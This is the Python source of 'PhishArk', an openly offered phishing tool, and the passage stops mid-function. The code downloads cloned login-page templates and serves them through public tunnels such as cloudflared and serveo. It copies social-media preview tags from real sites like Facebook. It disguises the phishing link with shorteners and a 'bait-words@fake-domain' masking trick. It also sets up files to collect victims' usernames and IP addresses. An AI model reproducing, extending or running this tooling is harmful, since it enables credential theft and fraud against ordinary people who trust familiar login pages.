#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
"""
PhishArk - Advanced Phishing Tool
---------------------------------
Author       : Arpit Dhameliya, Zeel Patel
Version      : 1.2.1
License      : MIT
Description  : Advanced phishing tool supporting 70 website templates and sends data to Telegram Bot
Repository   : github.com/arpitxp | gitlab.com/arpitxd
Credits      : KasRoudra - PyPhisher
Copyright (c) 2024-2025 arpitxd

MIT License
...
"""

import os
import stat
import signal
import subprocess
import platform
import tarfile
import zipfile
import re
import json
import time
from argparse import ArgumentParser
from importlib import import_module as dynamic_import
from hashlib import sha256
from json import loads as json_loads
from os import chmod, getenv, kill, listdir, makedirs, mkdir, mknod, popen, remove
from os.path import abspath, basename, dirname, isdir, isfile, join
from subprocess import DEVNULL, PIPE, Popen, run
from signal import SIGINT
from time import sleep
from platform import uname

import requests
from requests import get, post, head, Session
from requests.exceptions import ConnectionError

from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    Progress,
    TextColumn,
    TimeRemainingColumn,
    TransferSpeedColumn
)
from rich.traceback import install as install_rich_traceback

from bs4 import BeautifulSoup

# Setup rich traceback
install_rich_traceback()
console = Console()

# Color definitions
class Colors:
    BLACK   = "\033[0;30m"
    RED     = "\033[0;31m"
    BRED    = "\033[1;31m"
    GREEN   = "\033[0;32m"
    BGREEN  = "\033[1;32m"
    YELLOW  = "\033[0;33m"
    BYELLOW = "\033[1;33m"
    BLUE    = "\033[0;34m"
    BBLUE   = "\033[1;34m"
    PURPLE  = "\033[0;35m"
    BPURPLE = "\033[1;35m"
    CYAN    = "\033[0;36m"
    BCYAN   = "\033[1;36m"
    WHITE   = "\033[0;37m"
    NC      = "\033[00m"

# Message templates
ASK_PROMPT  = f"{Colors.GREEN}[{Colors.WHITE}?{Colors.GREEN}] {Colors.YELLOW}"
SUCCESS_MSG = f"{Colors.YELLOW}[{Colors.WHITE}√{Colors.YELLOW}] {Colors.GREEN}"
ERROR_MSG   = f"{Colors.BLUE}[{Colors.WHITE}!{Colors.BLUE}] {Colors.RED}"
INFO_MSG    = f"{Colors.YELLOW}[{Colors.WHITE}+{Colors.YELLOW}] {Colors.CYAN}"
INFO2_MSG   = f"{Colors.GREEN}[{Colors.WHITE}•{Colors.GREEN}] {Colors.CYAN}"

# Logo (raw formatted string)
LOGO = rf"""
{Colors.BGREEN}  ____  _     _     _        _         _    
 |  _ \| |__ (_)___| |__    / \   _ __| | __
 | |_) | '_ \| / __| '_ \  / _ \ | '__| |/ / 
 |  __/| | | | \__ \ | | |/ ___ \| |  |   <  
 |_|   |_| |_|_|___/_| |_/_/   \_\_|  |_|\_\\
       {" "*20}       {Colors.CYAN}[v1.2.1]
   {" "*30}      {Colors.RED}[By {chr(0x41)}{chr(0x72)}{chr(0x70)}{chr(0x69)}{chr(0x74)}{chr(0x78)}{chr(0x64)} & {chr(0x5A)}{chr(0x65)}{chr(0x65)}{chr(0x6C)}]
{Colors.NC}
"""

# Global constants and defaults
VERSION             = "1.2.1"
TELEGRAM_BOT_TOKEN  = ""
TELEGRAM_CHAT_ID    = ""
DEFAULT_PORT        = 9000
DEFAULT_TUNNELER    = "Cloudflared"
DEFAULT_TEMPLATE    = "60"
SUPPORTED_PYTHON    = 3

# URLs and directories
REPO_URL    = "https://gitlab.com/\x61\x72\x70\x69\x74\x78\x64/PhishArk"
SITES_REPO  = "https://gitlab.com/arpitxd/phishark_sites"
HOME_DIR    = getenv("HOME")
SSH_DIR     = f"{HOME_DIR}/.ssh"
SITES_DIR   = f"{HOME_DIR}/.websites"
TEMPLATES_FILE = f"{SITES_DIR}/webtemplate.json"
TUNNEL_DIR  = f"{HOME_DIR}/.tunneler"
SITE_DIR    = f"{HOME_DIR}/.site"
CRED_FILE   = f"{SITE_DIR}/usernames.txt"
IP_FILE     = f"{SITE_DIR}/ip.txt"
MAIN_IP     = "ip.txt"
MAIN_INFO   = "info.txt"
MAIN_CRED   = "creds.txt"
ERROR_FILE  = "error.log"

# Log file paths for tunnelers
PHP_LOG_FILE = f"{TUNNEL_DIR}/php.log"
CF_LOG_FILE  = f"{TUNNEL_DIR}/cf.log"
LX_LOG_FILE  = f"{TUNNEL_DIR}/loclx.log"
LHR_LOG_FILE = f"{TUNNEL_DIR}/lhr.log"
SVO_LOG_FILE = f"{TUNNEL_DIR}/svo.log"

# Process and package lists
PACKAGES   = ["php", "ssh", "lolcat"]
MODULES    = ["requests", "rich", "beautifulsoup4:bs4"]
TUNNELERS  = ["cloudflared", "loclx"]
PROCESSES  = ["php", "ssh", "cloudflared", "loclx", "localxpose"]

# Global runtime variables
redirection_url = ""
mask_str = ""
termux_mode = False
saved_file = f"{HOME_DIR}/.creds.txt"
local_url = None

# Adjust commands based on environment
CF_COMMAND = f"{TUNNEL_DIR}/cloudflared"
LX_COMMAND = f"{TUNNEL_DIR}/loclx"
if isdir("/data/data/com.termux/files/home"):
    termux_mode = True
    CF_COMMAND = f"termux-chroot {CF_COMMAND}"
    LX_COMMAND = f"termux-chroot {LX_COMMAND}"
    saved_file = "/sdcard/.creds.txt"

# Tunneling commands mapping
def tunnel_commands(local_addr):
    return {
        "cloudflared": f"{CF_COMMAND} tunnel -url {local_addr}",
        "localxpose": f"{LX_COMMAND} tunnel http -t {local_addr}",
        "localhostrun": f"ssh -R 80:{local_addr} localhost.run -T -n",
        "serveo": f"ssh -R 80:{local_addr} serveo.net -T -n",
        "cf": f"{CF_COMMAND} tunnel -url {local_addr}",
        "loclx": f"{LX_COMMAND} tunnel http -t {local_addr}",
        "lhr": f"ssh -R 80:{local_addr} localhost.run -T -n",
        "svo": f"ssh -R 80:{local_addr} serveo.net -T -n"
    }

# Utility class for various helper methods
class Utils:
    @staticmethod
    def run_shell(cmd, capture_output=False, cwd="."):
        try:
            return run(cmd, shell=True, capture_output=capture_output, cwd=cwd)
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
            return None

    @staticmethod
    def background_task(cmd, stdout=PIPE, stderr=DEVNULL, cwd="."):
        try:
            return Popen(cmd, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
            return None

    @staticmethod
    def append_to_file(content, filename):
        with open(filename, "a") as f:
            f.write(str(content) + "\n")

    @staticmethod
    def write_to_file(content, filename):
        with open(filename, "w") as f:
            f.write(str(content) + "\n")

    @staticmethod
    def read_file(filepath):
        if isfile(filepath):
            with open(filepath, "r") as f:
                return f.read()
        return ""

    @staticmethod
    def remove_path(path):
        if isdir(path):
            import shutil
            shutil.rmtree(path)
        elif isfile(path):
            remove(path)

    @staticmethod
    def replace_in_file(search_text, replace_text, infile, outfile=None, count=None):
        content = Utils.read_file(infile)
        if not outfile:
            outfile = infile
        if count is None:
            new_content = content.replace(search_text, replace_text)
        else:
            new_content = content.replace(search_text, replace_text, count)
        Utils.write_to_file(new_content, outfile)

    @staticmethod
    def regex_search(pattern, target):
        if isfile(target):
            content = Utils.read_file(target)
        else:
            content = target
        result = re.search(pattern, content)
        if result:
            return result.group(1)
        return ""

    @staticmethod
    def check_if_installed(cmd):
        proc = Utils.background_task(f"command -v {cmd}")
        if proc:
            return proc.wait() == 0
        return False

    @staticmethod
    def check_process_running(name):
        proc = Utils.background_task(f"pidof {name}")
        if proc:
            return proc.wait() == 0
        return False

    @staticmethod
    def print_slow(text, delay=0.02):
        for ch in text + "\n":
            os.sys.stdout.write(ch)
            os.sys.stdout.flush()
            sleep(delay)

    @staticmethod
    def colorful_print(text, panel_title="", border="blue"):
        console.print(Panel(text, title=panel_title, title_align="left", border_style=border))

# Class encapsulating the PhishArk tool functionality
class PhishArk:
    def __init__(self, args):
        self.port = args.port
        self.template_opt = args.option
        self.tunneler = args.tunneler
        self.region = args.region
        self.subdomain = args.subdomain
        self.redirect_url_input = args.url
        self.mode = args.mode
        self.troubleshoot = args.troubleshoot
        self.use_key = args.nokey if self.mode != "test" else False
        self.skip_update = args.noupdate
        self.show_kshrt = args.kshrt
        global local_url
        local_url = f"127.0.0.1:{self.port}"
        self.cf_cmd = CF_COMMAND
        self.lx_cmd = LX_COMMAND

    def verify_python_version(self):
        if os.sys.version_info[0] != SUPPORTED_PYTHON:
            print(f"{ERROR_MSG}Only Python version {SUPPORTED_PYTHON} is supported!\nYour python version is {os.sys.version_info[0]}")
            exit(0)

    def install_required_modules(self):
        for module_item in MODULES:
            if ":" in module_item:
                module_name, importer_name = module_item.split(":")
            else:
                module_name = importer_name = module_item
            try:
                dynamic_import(importer_name)
            except ImportError:
                try:
                    print(f"Installing {module_name}")
                    run(f"pip3 install {module_name} --break-system-packages", shell=True)
                except Exception:
                    print(f"{module_name} cannot be installed! Install it manually by {Colors.GREEN}'pip3 install {module_name}'")
                    exit(1)
            except Exception:
                exit(1)
        # Try re-importing to confirm installation
        for module_item in MODULES:
            if ":" in module_item:
                module_name, importer_name = module_item.split(":")
            else:
                module_name = importer_name = module_item
            try:
                dynamic_import(importer_name)
            except Exception:
                print(f"{module_name} cannot be installed! Install it manually by {Colors.GREEN}'pip3 install {module_name}'")
                exit(1)

    def show_logo(self, use_fast=False, use_lol=False):
        os.system("clear")
        if use_fast:
            print(LOGO)
        elif use_lol:
            escaped_logo = LOGO.replace('"', '\\"')
            Utils.run_shell(f'printf "%s\\n" "{escaped_logo}" | lolcat')
        else:
            Utils.print_slow(LOGO, delay=0.01)

    def update_check(self):
        if self.skip_update:
            return
        if not isfile("data/phishark.png"):
            return
        try:
            remote_toml = get("https://gitlab.com/arpitxd/phishark/-/blob/main/data/pyproject.toml").text
            match = re.search(r'version\s*=\s*"([^"]+)"', remote_toml)
            remote_version = match.group(1) if match else "404: Not Found"
        except Exception as e:
            Utils.append_to_file(e, ERROR_FILE)
            remote_version = VERSION
        if remote_version != "404: Not Found" and self.get_ver(remote_version) > self.get_ver(VERSION):
            changelog = get("https://gitlab.com/arpitxd/phishark/-/blob/main/data/changelog.log").text.split("\n\n\n")[0]
            self.show_logo(use_fast=True)
            print(f"{INFO_MSG}New update available!\n{INFO2_MSG}Current: {Colors.RED}{VERSION}\n{INFO_MSG}Available: {Colors.GREEN}{remote_version}")
            answer = input(f"\n{ASK_PROMPT}Do you want to update PhishArk?[y/n] > {Colors.GREEN}")
            if answer.lower() == "y":
                os.system("cd .. && rm -rf PhishArk phishark && git clone " + REPO_URL)
                Utils.print_slow(f"\n{SUCCESS_MSG}PhishArk updated successfully! Please restart your terminal!")
                if changelog != "404: Not Found":
                    Utils.print_slow(f"\n{INFO2_MSG}Changelog:\n{Colors.PURPLE}{changelog}")
                exit()
            elif answer.lower() == "n":
                print(f"\n{INFO_MSG}Updating cancelled. Continuing with the current version!")
                sleep(2)
            else:
                print(f"\n{ERROR_MSG}Invalid input!")
                sleep(2)

    @staticmethod
    def get_ver(ver: str) -> int:
        return int(ver.replace(".", "", 2))

    def install_dependencies(self):
        # Termux storage permission check
        if termux_mode:
            for _ in range(2):
                try:
                    if not isfile(saved_file):
                        mknod(saved_file)
                    with open(saved_file) as f:
                        _ = f.read()
                    break
                except (PermissionError, OSError):
                    os.system("termux-setup-storage")
                except Exception as err:
                    print(f"{ERROR_MSG}{err}")
                else:
                    sleep(1)
            else:
                print(f"\n{ERROR_MSG}Storage permission not granted for termux. Exiting!")
                sleep(2)
                exit(0)
        # Internet connection check
        self.check_internet()
        if termux_mode and not Utils.check_if_installed("proot"):
            Utils.print_slow(f"\n{INFO_MSG}Installing proot...",)
            os.system("pkg install proot -y")
        # Install packages and SSH
        self.installer("php")
        self.installer("lolcat")
        if Utils.check_if_installed("apt") and not Utils.check_if_installed("pkg"):
            self.installer("ssh", "openssh-client")
        else:
            self.installer("ssh", "openssh")
        for pkg in PACKAGES:
            if not Utils.check_if_installed(pkg):
                print(f"{ERROR_MSG}{pkg} is not installed! Please install it manually.")
                exit(1)
        self.kill_running_processes()
        self.download_tunnelers()
        if isfile("websites.zip"):
            Utils.remove_path(SITES_DIR)
            print(f"\n{INFO_MSG}Copying website files...")
            self.extract_file("websites.zip", SITES_DIR)
        elif isdir("sites"):
            print(f"\n{INFO_MSG}Copying website files...")
            self.copy_folder("sites", SITES_DIR)
        else:
            print(f"\n{INFO_MSG}Cloning website repo...")
            os.system(f"git clone {SITES_REPO} {SITES_DIR}")
        if self.mode != "test":
            self.setup_loclx_token()
            self.setup_ssh_key()

    def installer(self, package, pkg_name=None):
        if pkg_name is None:
            pkg_name = package
        for mgr in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman", "yay"]:
            if Utils.check_if_installed(mgr) and not Utils.check_if_installed(package):
                Utils.print_slow(f"\n{INFO_MSG}Installing {package}...")
                if mgr == "pacman":
                    os.system(f"sudo {mgr} -S {pkg_name} --noconfirm")
                elif mgr == "apk":
                    if Utils.check_if_installed("sudo"):
                        os.system(f"sudo {mgr} add {pkg_name}")
                    else:
                        os.system(f"{mgr} add -y {pkg_name}")
                elif Utils.check_if_installed("sudo"):
                    os.system(f"sudo {mgr} install -y {pkg_name}")
                else:
                    os.system(f"{mgr} install -y {pkg_name}")
                break
        if Utils.check_if_installed("brew"):
            if not Utils.check_if_installed("cloudflared"):
                os.system("brew install cloudflare/cloudflare/cloudflared")
            if not Utils.check_if_installed("localxpose"):
                os.system("brew install localxpose")

    def kill_running_processes(self):
        for proc in PROCESSES:
            if Utils.check_process_running(proc):
                # pid_string = Utils.background_task(f"pidof {proc}", stdout=PIPE).stdout.decode("utf-8").strip()
                proc_pid = Utils.background_task(f"pidof {proc}", stdout=PIPE)
                pid_out, _ = proc_pid.communicate()
                pid_string = pid_out.decode("utf-8").strip()

                for pid in pid_string.split():
                    kill(int(pid), SIGINT)

    def download_tunnelers(self):
        osinfo = uname()
        plat = osinfo.system.lower()
        arch = osinfo.machine
        cf_exists = isfile(f"{TUNNEL_DIR}/cloudflared")
        lx_exists = isfile(f"{TUNNEL_DIR}/loclx")
        Utils.remove_path("cloudflared.tgz")
        Utils.remove_path("cloudflared")
        Utils.remove_path("loclx.zip")
        self.check_internet()
        if "linux" in plat:
            if "arm64" in arch or "aarch64" in arch:
                if not cf_exists:
                    Utils.run_shell("wget -q -O {0}/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64".format(TUNNEL_DIR))
                if not lx_exists:
                    Utils.run_shell("wget -q -O loclx.zip https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip")
            elif "arm" in arch:
                if not cf_exists:
                    Utils.run_shell("wget -q -O {0}/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm".format(TUNNEL_DIR))
                if not lx_exists:
                    Utils.run_shell("wget -q -O loclx.zip https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip")
            elif "x86_64" in arch or "amd64" in arch:
                if not cf_exists:
                    Utils.run_shell("wget -q -O {0}/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64".format(TUNNEL_DIR))
                if not lx_exists:
                    Utils.run_shell("wget -q -O loclx.zip https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip")
            else:
                if not cf_exists:
                    Utils.run_shell("wget -q -O {0}/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386".format(TUNNEL_DIR))
                if not lx_exists:
                    Utils.run_shell("wget -q -O loclx.zip https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip")
        elif "darwin" in plat:
            if "x86_64" in arch or "amd64" in arch:
                if not cf_exists:
                    Utils.run_shell("wget -q -O cloudflared.tgz https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz")
                    self.extract_file("cloudflared.tgz", TUNNEL_DIR)
                if not lx_exists:
                    Utils.run_shell("wget -q -O loclx.zip https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip")
            elif "arm64" in arch or "aarch64" in arch:
                if not cf_exists:
                    print(f"{ERROR_MSG}Device architecture unknown. Please download cloudflared manually!")
                if not lx_exists:
                    Utils.run_shell("wget -q -O loclx.zip https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip")
            else:
                print(f"{ERROR_MSG}Device architecture unknown. Please download tunnelers manually!")
                sleep(3)
        else:
            print(f"{ERROR_MSG}Device not supported!")
            exit(1)
        if isfile("loclx.zip"):
            self.extract_file("loclx.zip", TUNNEL_DIR)
            remove("loclx.zip")
        for tun in TUNNELERS:
            tun_path = f"{TUNNEL_DIR}/{tun}"
            if isfile(tun_path):
                chmod(tun_path, 0o755)
        for proc in PROCESSES:
            if Utils.check_process_running(proc):
                print(f"\n{ERROR_MSG}Process {proc} still running. Please restart terminal.")
                exit(0)
        if Utils.check_if_installed("cloudflared"):
            self.cf_cmd = "cloudflared"
        if Utils.check_if_installed("localxpose"):
            self.lx_cmd = "localxpose"

    def extract_file(self, file_path, extract_to, pwd=None):
        if dirname(extract_to) and not isdir(dirname(extract_to)):
            mkdir(dirname(extract_to))
        try:
            if file_path.endswith(".zip"):
                with zipfile.ZipFile(file_path, 'r') as zf:
                    if pwd is None:
                        zf.extractall(extract_to)
                    else:
                        try:
                            zf.extractall(extract_to, pwd=bytes(pwd, "utf-8"))
                        except Exception:
                            print(f"\n{ERROR_MSG}Wrong password!")
                            Utils.remove_path(file_path)
                            exit(1)
                return
            with tarfile.open(file_path, 'r') as tar:
                tar.extractall(extract_to)
                # For nested tar files:
                for item in tar.getnames():
                    if item.endswith((".tgz", ".tar")):
                        self.extract_file(item, os.path.join("./", item[:item.rfind('/')]))
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
            Utils.remove_path(file_path)
            print(f"{ERROR_MSG}{err}")
            exit(1)

    def copy_folder(self, src, dst):
        if isdir(src):
            if isdir(dst):
                Utils.remove_path(dst)
            for item in listdir(src):
                old_path = join(src, item)
                new_path = join(dst, item)
                if isdir(old_path):
                    self.copy_folder(old_path, new_path)
                else:
                    makedirs(dirname(new_path), exist_ok=True)
                    from shutil import copy2
                    copy2(old_path, new_path)
        elif isfile(src):
            from shutil import copy2
            if isdir(dst):
                copy2(src, dst)

    def check_internet(self, url="https://api.github.com", timeout=5):
        while True:
            try:
                head(url, timeout=timeout)
                break
            except ConnectionError:
                print(f"\n{ERROR_MSG}No internet!{Colors.NC}\007")
                sleep(2)
            except Exception as err:
                print(f"{ERROR_MSG}{err}")

    def setup_loclx_token(self):
        while True:
            proc = Utils.background_task(f"{self.lx_cmd} account status", stdout=PIPE)
            status = proc.stdout.read().decode("utf-8").strip().lower()
            if "error" not in status:
                break
            response = input(f"\n{ASK_PROMPT}Do you have a loclx authtoken? [y/N/help]: {Colors.GREEN}")
            if response.lower() == "y":
                os.system(f"{self.lx_cmd} account login")
                break
            elif response.lower() == "help":
                Utils.print_slow(f"\n{INFO_MSG}Follow instructions at https://localxpose.io")
                sleep(3)
            elif response.lower() in ["n", ""]:
                break
            else:
                print(f"\n{ERROR_MSG}Invalid input '{response}'!")
                sleep(1)

    def setup_ssh_key(self):
        if self.use_key and not isfile(f"{SSH_DIR}/id_rsa"):
            os.system(f"mkdir -p {SSH_DIR} && ssh-keygen -N '' -t rsa -f {SSH_DIR}/id_rsa")
        for host in ["localhost.run", "serveo.net"]:
            if Utils.background_task(f"ssh-keygen -F {host}").wait() != 0:
                os.system(f"ssh-keyscan -H {host} >> {SSH_DIR}/known_hosts")

    def display_about(self):
        os.system("clear")
        print(f"{Colors.RED}{Colors.YELLOW}[ToolName]      {Colors.CYAN} : {Colors.YELLOW}[{Colors.GREEN}PhishArk{Colors.YELLOW}]")
        print(f"{Colors.RED}{Colors.YELLOW}[Version]       {Colors.CYAN} : {Colors.YELLOW}[{Colors.GREEN}{VERSION}{Colors.YELLOW}]")
        print(f"{Colors.RED}{Colors.YELLOW}[Author]        {Colors.CYAN} : {Colors.YELLOW}[{Colors.GREEN}arpitxd{Colors.YELLOW}]")
        print(f"{Colors.RED}{Colors.YELLOW}[Github]        {Colors.CYAN} : {Colors.YELLOW}[{Colors.GREEN}https://github.com/arpitxp{Colors.YELLOW}]")
        print(f"{Colors.RED}{Colors.YELLOW}[Gitlab]        {Colors.CYAN} : {Colors.YELLOW}[{Colors.GREEN}https://gitlab.com/arpitxd{Colors.YELLOW}]")
        print(f"{Colors.RED}{Colors.YELLOW}[Telegram]      {Colors.CYAN} : {Colors.YELLOW}[{Colors.GREEN}https://t.me/z_Alex7{Colors.YELLOW}]")
        print(f"\n{Colors.GREEN}[0]{Colors.YELLOW} Exit      {Colors.GREEN}[x]{Colors.YELLOW} Main Menu\n")
        choice = input(f"\n{ASK_PROMPT}Choose an option: {Colors.GREEN}")
        if choice == "0":
            self.polite_exit()

    def write_meta(self):
        if self.mode == "test":
            return
        while True:
            meta_url = self.redirect_url_input if self.redirect_url_input else input(f"\n{ASK_PROMPT}{Colors.BCYAN}Enter shadow URL (for social media preview) [{Colors.RED}press enter to skip{Colors.BCYAN}] : {Colors.GREEN}")
            if meta_url == "":
                break
            elif meta_url.lower() == "help":
                Utils.print_slow("Shadow URL: URL that copies website preview for social media")
            else:
                meta_content = self.fetch_meta(meta_url)
                if meta_content == "":
                    print(f"\n{ERROR_MSG}No preview generated from specified URL!")
                Utils.write_to_file(meta_content, f"{SITE_DIR}/meta.php")
                break

    def fetch_meta(self, url):
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 Chrome/102.0.5005.99 Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
        }
        if "facebook" in url:
            headers.update({
                "upgrade-insecure-requests": "1",
                "dnt": "1",
                "content-type": "application/x-www-form-url-encoded",
                "origin": "https://m.facebook.com",
                "referer": "https://m.facebook.com/",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-user": "empty",
                "sec-fetch-dest": "document",
                "sec-ch-ua-platform": "Android",
                "accept-encoding": "gzip, deflate, br"
            })
        meta_all = ""
        try:
            response = get(url, headers=headers).text
            soup = BeautifulSoup(response, "html.parser")
            metas = soup.find_all("meta")
            if metas:
                meta_all = "\n".join(str(meta) for meta in metas)
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
        return meta_all

    def write_redirect(self):
        while True:
            redirect_input = self.redirect_url_input if self.redirect_url_input else input(f"\n{ASK_PROMPT}{Colors.BCYAN}Enter redirect URL [press enter to skip]: {Colors.GREEN}")
            if redirect_input == "":
                redirect_input = redirection_url
                Utils.replace_in_file("redirectUrl", redirect_input, f"{SITE_DIR}/login.php")
                break
            else:
                Utils.replace_in_file("redirectUrl", redirect_input, f"{SITE_DIR}/login.php")
                break

    def custom_site_folder(self):
        global mask_str
        while True:
            response = input(f"\n{ASK_PROMPT}Do you have custom site files? [y/N/b] > {Colors.GREEN}")
            if response.lower() == "y":
                folder_loc = input(f"\n{ASK_PROMPT}Enter the directory > {Colors.GREEN}")
                if isdir(folder_loc):
                    if isfile(f"{folder_loc}/index.php") or isfile(f"{folder_loc}/index.html"):
                        bait = input(f"\n{ASK_PROMPT}Enter a bait sentence (Example: free-money) > {Colors.GREEN}")
                        mask_str = "https://" + re.sub(r"([/%+&?={} ])", "-", bait)
                        Utils.remove_path(f"{folder_loc}/ip.txt")
                        Utils.remove_path(f"{folder_loc}/usernames.txt")
                        self.copy_folder(folder_loc, SITE_DIR)
                        return folder_loc
                    else:
                        Utils.print_slow(f"\n{ERROR_MSG}index.php/index.html is required but not found!")
                else:
                    Utils.print_slow(f"\n{ERROR_MSG}Directory doesn't exist!")
            elif response.lower() == "b":
                self.main_menu()
            else:
                Utils.print_slow(f"\n{INFO_MSG}Contact Arpit")
                os.system("xdg-open https://t.me/z_Alex7")
                self.polite_exit()

    def display_saved(self):
        os.system("clear")
        print(f"\n{INFO_MSG}Saved details:\n{Colors.NC}")
        content = Utils.read_file(saved_file)
        self.display_file_content(content)
        print(f"\n{Colors.GREEN}[0]{Colors.YELLOW} Exit      {Colors.GREEN}[x]{Colors.YELLOW} Main Menu\n")
        ch = input(f"\n{ASK_PROMPT}Choose your option: {Colors.GREEN}")
        if ch == "0":
            self.polite_exit()

    def display_file_content(self, content):
        decorated = ""
        for line in content.splitlines():
            decorated += f"[cyan][[green]*[cyan]][yellow] {line}\n"
        Utils.colorful_print(decorated.strip(), panel_title="[bold green]PhishArk Data[/]", border="blue")

    def url_manager(self, url_str, tunneler_name):
        global mask_str
        masked = mask_str + "@" + url_str.replace("https://", "")
        panel_title = f"[bold cyan]{tunneler_name}[/]"
        panel_text = f"[blue]URL[/] [green]:[/] [yellow]{url_str}[/]\n[blue]MaskedURL[/] [green]:[/] [yellow]{masked}[/]"
        Utils.colorful_print(panel_text, panel_title, border="green")
        sleep(0.5)

    def custom_masking(self, url_str):
        # This method tries various shortener services
        shortened = self.try_shorteners(url_str)
        if shortened == "":
            kurl = self.kshrt_shorten(url_str)
            shortened = self.try_shorteners(kurl)
            if shortened == "":
                Utils.print_slow(f"\n{ERROR_MSG}Url shortning Service not available!")
                self.wait_for_creds()
                return
        short = shortened.replace("http://", "").replace("https://", "")
        domain = input(f"\n{ASK_PROMPT}Enter custom domain (Example: google.com, yahoo.com): ") or "https://"
        domain = "https://" + re.sub(r"([/%+&?={} ])", ".", re.sub(r"https?://", "", domain))
        bait = input(f"\n{ASK_PROMPT}Enter bait words with hyphen (Example: free-money, pubg-mod): ")
        if bait == "":
            print(f"\n{ERROR_MSG}No bait word!")
            bait = "@" if domain != "https://" else ""
        else:
            bait = ("-" + re.sub(r"([/%+&?={} ])", "-", bait) + "@") if domain != "https://" else (re.sub(r"([/%+&?={} ])", "-", bait) + "@")
        final_url = domain + bait + short
        Utils.colorful_print(f"[cyan]URL[/] [green]:[/] [yellow]{final_url}[/]", panel_title="[bold blue]Custom[/]", border="blue")
        if self.show_kshrt:
            kshrt_text = f"[cyan]URL[/] [blue]:[/] [yellow]{kurl}[/]"
            Utils.colorful_print(kshrt_text, panel_title="[bold green]Kshrt[/]", border="green")
        panel_text = f"[cyan]URL[/] [green]:[/] [yellow]{final_url}[/]"
        Utils.colorful_print(panel_text, panel_title="[bold blue]Custom[/]", border="blue")

    def try_shorteners(self, url_str):
        # Try is.gd
        try:
            ret = get("https://is.gd/create.php?format=simple&url=" + url_str.strip()).text.split("\n")[0]
            if "https://" in ret:
                return ret
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
        # Try shrtco.de
        try:
            resp = get("https://api.shrtco.de/v2/shorten?url=" + url_str.strip()).text
            parsed = json_loads(resp)
            if parsed and parsed.get("ok"):
                return parsed["result"]["full_short_link"]
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
        # Try tinyurl.com
        try:
            ret = get("https://tinyurl.com/api-create.php?url=" + url_str.strip()).text.split("\n")[0]
            if "http://" in ret or "https://" in ret:
                return ret
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
        return ""

    def kshrt_shorten(self, url_str):
        mapping = {
            ".trycloudflare.com": "cf",
            ".loclx.io": "lx",
            ".lhr.life": "lhr",
            ".lhr.pro": "lhro",
            ".serveo.net": "svo",
        }
        route = ""
        subd = ""
        for key in mapping.keys():
            if key in url_str:
                route = mapping[key]
                subd = url_str.replace("https://", "").replace(key, "")
                break
        if not route:
            return url_str
        website = f"https://kshrt.onrender.com/{route}/{subd}"
        self.check_internet()
        try:
            res = post(website, timeout=30).text
        except Exception as err:
            Utils.append_to_file(err, ERROR_FILE)
            res = ""
        shortened = res.split("\n")[0] if "\n" in res else res
        return shortened if "https://" in shortened else url_str

    def main_menu(self):
        os.system("stty -echoctl")
        if not self.skip_update:
            self.update_check()
        self.install_dependencies()
        if self.troubleshoot in tunnel_commands(local_url):
            os.system(tunnel_commands(local_url)[self.troubleshoot])
            self.polite_exit()
        while True:
            temp_data = Utils.read_file(TEMPLATES_FILE)
            try:
                sites = json.loads(temp_data)
            except Exception:
                Utils.print_slow(f"\n{ERROR_MSG}templates.json file is corrupted!")
                exit(1)
            names = [site["name"] for site in sites]
            self.show_logo(use_lol=True)
            self.display_site_options(names)
            choice = self.template_opt if self.template_opt else (self.mode == "test" and DEFAULT_TEMPLATE or input(f"{ASK_PROMPT}Select one of the options > {Colors.GREEN}"))
            if choice != "0" and choice.startswith("0"):
                choice = choice.replace("0", "")
            if choice.isdigit() and 1 <= int(choice) <= len(sites):
                sel_site = sites[int(choice) - 1]
                folder = sel_site["folder"]
                otp_folder = sel_site.get("otp_folder", "")
                global mask_str
                mask_str = sel_site.get("mask", "")
                redirection_url_local = sel_site.get("redirect", "")
                if folder == "custom" and mask_str == "custom":
                    self.custom_site_folder()
                if otp_folder:
                    otp = input(f"\n{ASK_PROMPT}Do you want OTP Page? [y/n] > {Colors.GREEN}")
                    if otp.lower() == "y":
                        folder = otp_folder
                break
            elif choice.lower() == "a":
                self.display_about()
            elif choice.lower() == "o":
                self.add_zip_templates()
            elif choice.lower() == "s":
                self.display_saved()
            elif choice == "0":
                self.polite_exit()
            else:
                Utils.print_slow(f"\n{ERROR_MSG}Wrong input \"{choice}\"")
                self.template_opt = None
        # Setup site files
        if folder != "custom":
            site_path = f"{SITES_DIR}/{folder}"
            if not isdir(site_path):
                self.check_internet()
                Utils.remove_path("site.zip")
                os.system(f"wget -q -O site.zip https://github.com/arpitxp/files/raw/main/phishingsites/{folder}.zip")
                self.extract_file("site.zip", site_path)
                remove("site.zip")
            self.copy_folder(site_path, SITE_DIR)
            self.write_meta()
            if self.redirect_url_input is None:
                self.redirect_url_input = "" if self.mode == "test" else None
            self.write_redirect()
        self.launch_server()

    def display_site_options(self, site_names):
        total = len(site_names)
        def format_option(i, max_length):
            if i >= total:
                return ""
